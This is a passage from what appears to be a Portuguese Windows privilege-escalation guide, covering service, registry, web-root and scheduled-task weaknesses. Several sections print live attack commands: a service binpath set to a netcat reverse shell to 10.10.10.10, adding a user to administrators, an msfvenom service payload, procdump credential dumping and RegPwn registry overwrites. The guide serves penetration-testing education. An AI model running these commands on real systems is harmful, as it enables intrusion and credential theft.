Verifique se você pode **sobrescrever algum binário em execução** ou se tem permissões de gravação na pasta do binário para explorar possíveis [**ataques de DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Sempre verifique se há [**electron/cef/chromium debuggers** em execução; você pode abusar deles para escalar privilégios](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Um listener de debugger pode durar pouco; portanto, sua ausência em uma única captura passiva de portas não prova que ele nunca esteve exposto. Correlacione qualquer listener observado com seu PID, o proprietário do processo e a capacidade do usuário com menos privilégios de acessá-lo; o nome de um aplicativo ou uma flag de debug, por si só, não comprova a execução de código entre usuários. Mantenha a enumeração rotineira passiva, em vez de enviar comandos ao debugger.

**Verificando as permissões dos binários dos processos**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Verificando permissões das pastas dos binários dos processos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Diretórios de pré-processadores dinâmicos do Snort

O Snort 2 pode carregar bibliotecas compartilhadas de um `dynamicpreprocessor directory` declarado na configuração selecionada com `snort.exe -c <config>`. Para uma tarefa agendada ou serviço que execute o Snort com outra conta, inspecione essa configuração específica e as ACLs do diretório de módulos declarado. Se o seu token puder criar arquivos nesse local, o caminho é um candidato à análise de execução de código na próxima vez que essa tarefa ou serviço carregar módulos. Verifique os privilégios efetivos da conta de execução, a configuração ativa, a compatibilidade dos módulos e quaisquer restrições de negação ou compartilhamento; um diretório gravável, por si só, não comprova elevação. A [documentação dos pré-processadores dinâmicos do Snort](https://www.snort.org/documents/dpx-readme) descreve o carregamento de módulos em tempo de execução.

### Serviço Web privilegiado com raiz de documentos gravável

Em uma instalação do Apache no Windows, compare o caminho do executável do serviço e a conta usada para executá-lo com o `DocumentRoot` no `httpd.conf` ativo. Em uma instalação convencional do XAMPP, inspecione `C:\xampp\apache\conf\httpd.conf` e as ACLs da raiz de documentos configurada, geralmente `C:\xampp\htdocs`. Se um usuário com menos privilégios puder criar arquivos nessa raiz enquanto o Apache é executado como `LocalSystem`, a execução de código no lado do servidor poderá ultrapassar o limite de privilégios do host. Confirme que o serviço está em execução, que o caminho exato é servido e que um manipulador no lado do servidor processa o tipo de arquivo; uma raiz gravável, por si só, comprova apenas a criação de arquivos. Inspecione as ACLs sem gravar um arquivo de teste:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Para uma instalação WAMP convencional, o serviço pode apontar para uma versão específica de `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ou `C:\wamp\...` em uma instalação de 32 bits), com a configuração ao lado, em `conf\httpd.conf`, e uma raiz padrão `C:\wamp64\www` ou `C:\wamp\www`. Verifique em conjunto o executável exato do serviço, a identidade usada para executá-lo, o `DocumentRoot` efetivo (incluindo a expansão de `${INSTALL_DIR}` e as substituições de virtual hosts) e a ACL da raiz. Um diretório WAMP com permissão de gravação não comprova que o Apache seja executado como `SYSTEM` ou execute o arquivo enviado. [A documentação do Apache explica como um serviço do Windows seleciona sua configuração](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Raiz gravável do IIS e identidade de rede do application pool

No IIS, associe um diretório físico gravável a um **site/aplicativo ativo** em `applicationHost.config` e, em seguida, identifique o pool configurado e o handler do servidor. O código colocado em um diretório servido é executado como o pool somente se o IIS processar esse tipo de arquivo e a rota estiver acessível. Verifique o acesso efetivo do usuário atual para criar arquivos, o estado de execução do site, o handler e as substituições por caminho antes de considerar que um diretório gravável permite execução de código.

A compilação dinâmica do ASP.NET apresenta outro caminho a revisar: os arquivos gerados no diretório de compilação do aplicativo. Por padrão, eles ficam em um diretório `Temporary ASP.NET Files` sob a instalação relevante do .NET Framework, mas `<compilation tempDirectory>` do aplicativo pode alterar esse local. [A Microsoft documenta o local e os subdiretórios por aplicativo](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) e [recomenda isolar diretórios de compilação quando os application pools não confiam uns nos outros](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Se um token com menos privilégios puder alterar o código-fonte gerado no cache **específico** do aplicativo, determine se esse aplicativo o recompila sob uma [identidade de worker process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) mais privilegiada. Uma ACL de arquivo ou diretório, por si só, não comprova execução de código: correlacione o cache com o aplicativo ativo, o token efetivo e a ACL, as configurações de compilação, a identidade do processo e o momento de qualquer recompilação. Faça uma revisão somente leitura dos metadados; não dispare a compilação nem altere arquivos de cache durante a enumeração.

Um pool do IIS configurado como `ApplicationPoolIdentity` ou `NetworkService` geralmente se autentica em recursos de domínio como a **conta do computador host**, embora seu token local possa ter poucos privilégios. `LocalSystem` já tem privilégios locais elevados e também usa a conta do computador na rede; `LocalService` normalmente apresenta credenciais de rede anônimas. Um pool `SpecificUser` usa a conta configurada. [A Microsoft documenta esses tipos de identidade](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) e [a identidade de rede do application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Uma configuração de identidade omitida pode herdar os padrões do pool, que variam entre versões do IIS; portanto, determine a configuração efetiva em vez de deduzi-la pelo nome do pool. Se a execução de código alcançar um pool com identidade de rede da conta do computador, avalie os direitos de diretório **desse computador específico**. [DCSync](../active-directory-methodology/dcsync.md) exige direitos de replicação no contexto de nomenclatura do domínio; um ticket da conta de máquina ou a função do host, por si só, não os comprova. A enumeração passiva deve inspecionar a configuração e as ACLs sem enviar um arquivo, realizar uma autenticação de rede ou solicitar tickets.

Para um handler ASP.NET legível que inicia um processo auxiliar, rastreie qualquer valor derivado da requisição ao longo da autenticação, descriptografia, validação e construção do comando. Um handler que concatene um token decodificado em `ProcessStartInfo("cmd", "/c ...")` pode permitir que metacaracteres do shell alterem o comando; [a Microsoft documenta os caracteres especiais de `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Confirme que um chamador não confiável pode realmente influenciar o valor decodificado e acessar o handler; em seguida, determine a identidade efetiva do application pool ou da impersonação e a identidade do processo filho. Uma linha de código-fonte legível, um listener em localhost ou uma falha no formato do token, isoladamente, não comprovam execução de comandos privilegiados. Revise o código-fonte e a configuração do pool sem enviar requisições forjadas nem executar o processo auxiliar durante a enumeração passiva.

Para um serviço PHP no Windows, um caminho controlado pela requisição e passado a [`include` ou `require`](https://www.php.net/manual/en/function.include.php) pode avaliar um arquivo PHP gravável por um usuário com menos privilégios, usando a identidade do worker. Confirme que a requisição pode alcançar essa instrução, que o caminho resolvido aponta para um arquivo que o usuário com menos privilégios pode modificar e o worker pode ler, que as restrições de caminho aplicáveis do PHP permitem a inclusão e que o worker realmente é executado com privilégios superiores. Um listener em loopback ou um arquivo gravável, por si só, não comprova essa cadeia; inspecione o código-fonte, a identidade do serviço e as ACLs dos arquivos sem acionar o endpoint durante a enumeração passiva.

### Mineração de senhas na memória

Você pode criar um dump de memória de um processo em execução usando o **procdump** do Sysinternals. Serviços como FTP têm **credenciais em texto claro na memória**; tente fazer o dump da memória e ler as credenciais.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Aplicativos GUI inseguros

**Aplicativos executados como SYSTEM podem permitir que um usuário abra um CMD ou navegue por diretórios.**

Exemplo: "Ajuda e Suporte do Windows" (Windows + F1), pesquise "prompt de comando" e clique em "Clique para abrir o Prompt de Comando"

### Importação de arquivos de projeto privilegiada

Um aplicativo que abre automaticamente projetos de um diretório de depósito gravável por um usuário de nível inferior cruza um limite de confiança de entrada sob a conta do importador. Revise o **caminho gravável exato**, o processo ou tarefa que o abre, sua identidade efetiva e a versão do parser. Um [problema histórico ao abrir/restaurar projetos do Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) permitia entidades externas XML nos metadados do projeto; uma entidade de rede no Windows poderia causar autenticação usando a conta do importador se a [política de saída SMB e NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) permitir. Isso é uma pista de exposição de credenciais, não acesso imediato de administrador: a resposta precisa poder ser usada por um caminho separado, autorizado ou vulnerável, e as versões atuais devem ser avaliadas conforme o estado real de aplicação de patches. Não abra um projeto criado para esse fim durante a enumeração passiva; inspecione o fluxo de importação e as ACLs.

## Serviços

O direito [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) do objeto Service Control Manager (SCM) é separado dos direitos sobre um serviço existente. Uma solicitação de acesso somente leitura bem-sucedida a [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) para esse direito é uma pista para revisão, não prova de que um novo serviço possa ser executado. [`CreateService` retorna um identificador](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) com o acesso ao serviço solicitado na criação; reabrir o serviço posteriormente realiza uma verificação de acesso separada e pode falhar mesmo quando o identificador original poderia ser usado. Verifique separadamente o token local ou remoto efetivo, os direitos concedidos ao identificador, a conta do serviço, a política de inicialização e o caminho do executável. Não crie nem inicie um serviço durante a enumeração passiva.

Para um caminho remoto de instalação de serviço, correlacione esses direitos do SCM com um compartilhamento no destino no qual o **mesmo logon de rede** possa gravar, sua ACL NTFS subjacente e um caminho de executável local que a conta do serviço possa executar. Uma conta não administrativa pode cruzar esse limite se houver direitos de SCM excepcionalmente amplos e também existir o caminho para colocar o arquivo; um compartilhamento administrativo não é um pré-requisito inerente. O acesso de gravação ao compartilhamento, por si só, ou uma pista isolada de criação de serviço pelo SCM não demonstra que o novo serviço possa ser iniciado com uma identidade mais privilegiada.

Um serviço existente pode invocar um executável auxiliar na inicialização, no desligamento ou em outro evento do ciclo de vida, mesmo quando esse auxiliar não consta em seu `ImagePath`. Se o nome do auxiliar for resolvido para um diretório gravável por um usuário de nível inferior e o serviço for executado com uma identidade mais privilegiada, a ausência do arquivo auxiliar pode ser uma oportunidade condicional de substituição. Confirme o **código real do serviço ou a invocação documentada do auxiliar**, o caminho do executável resolvido e a ordem de pesquisa, as permissões para criar diretórios, a identidade do serviço e a existência de um gatilho de ciclo de vida disponível. Um diretório de serviço gravável ou um arquivo ausente, por si só, não demonstra que o serviço carregará o arquivo; uma revisão passiva não deve iniciar nem parar o serviço.

Para um serviço existente, [`SERVICE_START` permite fornecer argumentos a `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); esse direito é distinto de [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Revise o código ou a interface documentada do serviço antes de considerar o direito de iniciar como algo além de um direito de controle. Se ele usar um argumento escolhido pelo chamador como caminho de log ou exportação, verifique a identidade do serviço, o fluxo exato do argumento até a gravação, as restrições de caminho e as permissões do **arquivo criado**. Uma gravação em um diretório protegido só pode levar à escalada se houver um consumidor ou carregador privilegiado separado que aceite esse arquivo; um log gravável ou o direito de iniciar, por si só, não é suficiente. O inventário passivo não deve iniciar o serviço nem criar um arquivo de teste.

Para um agente de monitoramento NSClient++, um `nsclient.ini` legível é uma **pista para revisão da configuração**: pode conter credenciais web, enquanto `boot.ini` pode redirecionar a configuração para outro local. Verifique a conta real do serviço, o listener WEB e a política de acesso, e se a função autenticada pode alterar configurações ou scripts. A execução privilegiada também exige `CheckExternalScripts` (ou outro caminho de execução habilitado), um direito efetivo para registrar ou modificar um comando e um gatilho que o execute sob a identidade do serviço. Um listener limitado ao loopback ainda pode ser acessível a um usuário local, mas o caminho do arquivo, a senha ou o listener, por si só, não comprovam esses direitos. Revise os metadados e as permissões sem exibir segredos nem invocar a API web durante a enumeração passiva. Consulte o [layout de arquivos do NSClient++](https://nsclient.org/docs/concepts/file-layout/), as [orientações de segurança para web e scripts](https://nsclient.org/docs/setup/securing/) e a [configuração de scripts externos](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Para um serviço cujo `ImagePath` seja `nssm.exe`, inspecione a conta real de execução do serviço e o valor `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [o NSSM armazena ali o aplicativo filho](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), enquanto `AppDirectory` é o diretório de trabalho configurado. Verifique o executável filho e as ACLs de seu diretório pai antes de considerar as permissões do wrapper como todo o limite do serviço. Um endpoint WCF ou SOAP local exposto por esse filho é uma pista de revisão separada: confirme que o usuário com menos privilégios consegue alcançar o listener, que a operação exata aceita a entrada dele e que o processo filho do serviço executa a operação insegura com uma identidade mais privilegiada. A conta do serviço, uma URL de endpoint ou um caminho gravável, por si só, não comprovam a escalada; evite invocar operações do serviço durante a enumeração passiva.

Para uma operação WCF personalizada, rastreie uma string controlada pelo chamador até qualquer runspace do PowerShell. [`Pipeline.Commands.AddScript` adiciona texto de script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), e [`Pipeline.Invoke` executa o pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Um [`netTcpBinding` com credenciais de transporte do Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentica o cliente, mas a autorização para chamar aquela **operação específica** e a identidade efetiva do runspace devem ser verificadas separadamente. Um caminho que leve a entrada de um chamador com menos privilégios até `AddScript` sob uma identidade de serviço mais privilegiada constitui um limite de execução de código; uma porta em escuta, um cliente autenticado ou um método não utilizado em um assembly não relacionado, por si só, não são prova. Revise estaticamente o serviço implantado, o contrato, a autorização e as configurações de impersonation, sem invocar o endpoint durante a enumeração.

Os Service Triggers permitem que o Windows inicie um serviço quando certas condições ocorrem (atividade de named pipe/endpoint RPC, eventos ETW, disponibilidade de IP, chegada de dispositivos, atualização de GPO etc.). Mesmo sem direitos SERVICE_START, muitas vezes é possível iniciar serviços privilegiados acionando seus gatilhos. Consulte aqui as técnicas de enumeração e ativação:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Serviço de coleta de diagnósticos do Visual Studio

Instalações do Visual Studio com ferramentas de C/C++ podem incluir `VSStandardCollectorService150`, um serviço de diagnóstico configurado para ser executado como `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) usou uma junction e uma condição de corrida com object-manager-link para redirecionar a redefinição de uma DACL de serviço. A escalada demonstrada também exigia um caminho utilizável de reparo MSI do Visual Studio Setup WMI Provider e seu destino `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. O componente foi corrigido em janeiro de 2024.

Para triagem passiva, inspecione a conta e o caminho do binário desse serviço, verifique se o caminho do compilador Setup WMI existe e confirme o estado dos patches do componente instalado. Uma entrada de serviço, a versão do produto Visual Studio ou a presença do arquivo do compilador, por si só, não demonstram que o host esteja vulnerável. A inspeção não exige iniciar o serviço nem executar um reparo.

Obtenha uma lista de serviços:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Permissões

Você pode usar **sc** para obter informações sobre um serviço.

```bash
sc qc <service_name>
```

Recomenda-se ter o binário **accesschk** da _Sysinternals_ para verificar o nível de privilégio necessário para cada serviço.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Recomenda-se verificar se "Authenticated Users" pode modificar algum serviço:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Você pode baixar o accesschk.exe para XP aqui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar serviço

Se você estiver recebendo este erro (por exemplo, com o SSDPSRV):

_Erro de sistema 1058._\
_O serviço não pode ser iniciado porque está desabilitado ou porque não há dispositivos habilitados associados a ele._

Você pode habilitá-lo usando

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Leve em consideração que o serviço upnphost depende de SSDPSRV para funcionar (no XP SP1)**

**Outra solução alternativa** para esse problema é executar:

```
sc.exe config usosvc start= auto
```

### **Modificar o caminho do binário do serviço**

No cenário em que o grupo "Authenticated users" possui **SERVICE_ALL_ACCESS** em um serviço, é possível modificar o binário executável do serviço. Para modificar e executar o **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Reiniciar serviço

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

É possível escalar privilégios por meio de várias permissões:

- **SERVICE_CHANGE_CONFIG**: Permite reconfigurar o binário do serviço.
- **WRITE_DAC**: Permite reconfigurar permissões, possibilitando alterar as configurações do serviço.
- **WRITE_OWNER**: Permite adquirir a propriedade e reconfigurar permissões.
- **GENERIC_WRITE**: Herda a capacidade de alterar as configurações do serviço.
- **GENERIC_ALL**: Também herda a capacidade de alterar as configurações do serviço.

Para detectar e explorar essa vulnerabilidade, é possível usar _exploit/windows/local/service_permissions_.

### Permissões fracas nos binários de serviços

Se um serviço for executado como **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ou uma conta de domínio privilegiada, mas **usuários com poucos privilégios puderem modificar o EXE do serviço ou sua pasta pai**, muitas vezes é possível sequestrar o serviço **substituindo o binário e reiniciando o serviço**.

**Verifique se você consegue modificar o binário executado por um serviço** ou se tem **permissões de gravação na pasta** onde o binário está localizado ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Você pode obter todos os binários executados por um serviço usando **wmic** (fora de system32) e verificar suas permissões usando **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Você também pode usar **sc** e **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Procure ACLs perigosas concedidas a **`Everyone`**, **`BUILTIN\Users`** ou **`Authenticated Users`**, especialmente **`(F)`**, **`(M)`** ou **`(W)`** no executável do serviço ou no diretório que o contém. Um fluxo prático de abuso é:<sup>[[27]](#references)</sup>

1. Confirme a conta do serviço e o caminho do executável com `sc qc <service_name>`.
2. Confirme que o binário pode ser gravado com `icacls <path>`.
3. Substitua o binário do serviço por um payload ou por um binário de serviço malicioso válido.
4. Reinicie o serviço com `sc stop <service_name> && sc start <service_name>` (ou aguarde uma reinicialização / um acionamento do serviço).

Verificações automatizadas úteis:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Se o serviço não permitir que um usuário comum o reinicie, verifique se ele inicia automaticamente na inicialização, tem uma ação de falha que o reinicia ou pode ser acionado indiretamente pelo aplicativo que o utiliza.

### Permissões para modificar o registro de serviços

Você deve verificar se consegue modificar algum registro de serviço.\
Você pode **verificar** suas **permissões** em um **registro** de serviço fazendo:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Verifique se **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** têm permissões de gravação no registro em uma chave de serviço específica. Uma entrada ACL, por si só, não comprova acesso efetivo: entradas de negação, o token atual e as permissões herdadas também são relevantes. Os direitos da chave do registro são distintos dos direitos `SERVICE_CHANGE_CONFIG` e `SERVICE_START` do objeto de serviço. O escalonamento também exige um campo utilizável na configuração do serviço, uma forma de acioná-lo e uma identidade de serviço com privilégios mais elevados. Consulte os [direitos de chave do registro](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) da Microsoft e a [referência de direitos de acesso a serviços](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Para alterar o caminho do binário executado:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Corrida de symlink do Registry para escrita arbitrária de valor HKLM (ATConfig)

Alguns recursos de Acessibilidade do Windows criam chaves **ATConfig** por usuário, que depois são copiadas por um processo **SYSTEM** para uma chave de sessão HKLM. Uma **corrida de link simbólico** no Registry pode redirecionar essa escrita privilegiada para **qualquer caminho HKLM**, oferecendo uma primitiva de **escrita arbitrária de valor** HKLM.<sup>[[18]](#references)</sup>

Locais das chaves (exemplo: Teclado Virtual `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lista os recursos de acessibilidade instalados.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` armazena a configuração controlada pelo usuário.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` é criada durante o logon/transições para a área de trabalho segura e pode ser gravada pelo usuário.

Fluxo de abuso (CVE-2026-24291 / ATConfig):

1. Preencha o valor **HKCU ATConfig** que você quer que seja gravado pelo SYSTEM.
2. Acione a cópia para a área de trabalho segura (por exemplo, **LockWorkstation**), que inicia o fluxo do broker AT.
3. **Vença a corrida** colocando um **oplock** em `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; quando o oplock for acionado, substitua a chave **HKLM Session ATConfig** por um **link do Registry** para um destino HKLM protegido.
4. O SYSTEM grava o valor escolhido pelo atacante no caminho HKLM redirecionado.

Depois de obter escrita arbitrária de valor HKLM, use-a para LPE sobrescrevendo valores de configuração de serviços:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/linha de comando)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Escolha um serviço que um usuário comum possa iniciar (por exemplo, **`msiserver`**) e acione-o após a escrita. **Observação:** a implementação pública do exploit **bloqueia a estação de trabalho** como parte da corrida.

Ferramentas de exemplo (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Permissões AppendData/AddSubdirectory no registro de serviços

Se você tiver essa permissão em uma chave do registro, isso significa que **pode criar subchaves a partir dela**. No caso dos serviços do Windows, isso é **suficiente para executar código arbitrário:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Se o caminho para um executável não estiver entre aspas, o Windows tentará executar cada trecho que termine antes de um espaço.

Por exemplo, para o caminho _C:\Program Files\Some Folder\Service.exe_, o Windows tentará executar:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Liste todos os caminhos de serviço sem aspas, excluindo aqueles pertencentes a serviços internos do Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Você pode detectar e explorar** esta vulnerabilidade com metasploit: `exploit/windows/local/trusted\_service\_path` Você pode criar manualmente um binário de serviço com metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Ações de recuperação

O Windows permite que os usuários especifiquem ações a serem executadas caso um serviço falhe. Esse recurso pode ser configurado para apontar para um binário. Se esse binário puder ser substituído, pode ser possível obter escalonamento de privilégios. Mais detalhes estão disponíveis na [documentação oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Destinos de scripts de tarefas agendadas

Para uma tarefa habilitada que executa `cmd.exe /c` com um arquivo `.bat` ou `.cmd`, verifique o script indicado nos **argumentos da ação**, bem como o `cmd.exe`. O mesmo se aplica ao argumento de arquivo explícito de um interpretador, como `-File` do PowerShell. Se um arquivo batch agendado contiver uma chamada literal do PowerShell com `-File`, verifique também a ACL do script referenciado; variáveis, condicionais e encadeamento de comandos exigem rastreamento manual. Um script ou diretório pai gravável pelo chamador é uma pista para execução entre contas somente quando o principal configurado para a tarefa é diferente do chamador e a tarefa realmente chega a essa ação. Uma ACL que permite apenas anexar conteúdo pode ser relevante para scripts, mas um `exit` anterior ou outro fluxo de controle pode tornar as linhas anexadas inacessíveis. Confirme as ACLs efetivas, o [contexto de execução da tarefa](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), o diretório de trabalho, o gatilho e a política de controle de aplicativos antes de alegar escalonamento. O inventário não deve modificar o script nem iniciar a tarefa.

## Fluxos nomeados em arquivos acessíveis

No NTFS, um arquivo legível pode ter um fluxo nomeado `:$DATA` cujo conteúdo não é exibido em uma listagem de diretório comum. Para um conjunto pequeno e relevante de arquivos de backup ou configuração acessíveis, examine os **nomes e tamanhos** dos fluxos antes de abrir qualquer conteúdo; o Windows os expõe por meio de [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) e do [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) do PowerShell. Um nome de fluxo que sugira um segredo é apenas uma pista. Verifique o acesso de leitura efetivo ao arquivo, o suporte do sistema de arquivos a fluxos, se o fluxo contém credenciais utilizáveis e a conta na qual elas realmente se autenticam. Evite varreduras recursivas de fluxos e a impressão do conteúdo dos fluxos durante a enumeração de rotina.

## Entradas auxiliares do Windows Driver Kit em tarefas agendadas

O Windows Driver Kit opcional inclui `StandaloneRunner.exe`, que pode consumir `command.txt`, `reboot.rsf` e um arquivo de projeto `working\rsf.rsf` do diretório de execução. Uma tarefa agendada ou um serviço que inicie esse auxiliar com uma conta privilegiada pode transformar o acesso de gravação de baixo privilégio a essas entradas em execução de comandos no contexto dessa conta, mesmo quando o próprio executável do auxiliar está protegido. Confirme que há um consumidor privilegiado e que **ambos** os arquivos auxiliares podem ser criados ou modificados; encontrar apenas o auxiliar não é suficiente.

Para uma tarefa agendada, inspecione `WorkingDirectory` da ação ([`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory)) e as ACLs dos dois caminhos dos arquivos auxiliares. Se a tarefa não especificar um diretório de trabalho, o diretório do executável é apenas uma pista a verificar, não uma prova de onde a tarefa lê as entradas. O pré-requisito do arquivo de trabalho do projeto também precisa ser atendido. Verifique o principal real da tarefa, em vez de presumir que ela é executada como SYSTEM.

## Aplicativos

### Aplicativos instalados

